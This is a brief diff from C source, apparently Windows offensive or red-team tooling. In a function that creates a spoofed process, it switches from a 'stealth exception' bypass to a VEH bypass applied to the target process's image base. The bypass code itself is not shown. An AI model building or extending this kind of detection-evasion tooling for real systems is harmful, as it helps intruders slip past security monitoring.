@@ -490,8 +490,11 @@ HANDLE CreateSpoofedProcess(LPCSTR lpSpoofedProcPath, PROCESS_INFORMATION* Pi, L
     
     PVOID pRemoteImageBase = NULL;
     ReadFromTargetProcess(Pi->hProcess, (PBYTE)PBI.PebBaseAddress + 0x10 /* ImageBaseAddress */, &pRemoteImageBase, sizeof(PVOID));
-    //ApplyVehBypass(Pi->hProcess, Pi->hThread, pRemoteImageBase);
-    ApplyStealthExceptionBypass(Pi->hProcess, Pi->hThread, pRemoteImageBase);
+    if (!ApplyVehBypass(Pi->hProcess, Pi->hThread, pRemoteImageBase)) {
+        printf("[!] Failed to apply VEH bypass\n");
+        goto cleanup;
+    }
+    //ApplyStealthExceptionBypass(Pi->hProcess, Pi->hThread, pRemoteImageBase);
 
 cleanup:
     if(pPeb) HeapFree(hHeap, 0, pPeb);
